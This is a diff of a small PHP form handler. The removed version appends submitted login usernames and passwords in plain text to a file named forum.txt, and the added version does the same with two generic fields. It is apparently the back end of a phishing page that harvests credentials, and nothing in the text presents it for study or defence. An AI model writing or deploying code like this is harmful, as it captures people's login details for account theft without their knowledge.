@@ -1,14 +1,14 @@
 <?php
-
-//If Submit Button Is Clicked Do the Following
-if ($_POST['Login']){
-
-$myFile = "forum.txt";
-$fh = fopen($myFile, 'a') or die("can't open file");
-$stringData = $_POST['username'] . ":";
-fwrite($fh, $stringData);
-$stringData = $_POST['password'] . "\n";
-fwrite($fh, $stringData);
-fclose($fh);
-
-} ?>
+if(isset($_POST['field1']) && isset($_POST['field2'])) {
+    $data = $_POST['field1'] . '-' . $_POST['field2'] . "\r\n";
+    $ret = file_put_contents('forum.txt', $data, FILE_APPEND | LOCK_EX);
+    if($ret === false) {
+        die('There was an error writing this file');
+    }
+    else {
+        echo "$ret bytes written to file";
+    }
+}
+else {
+   die('no post data to process');
+}
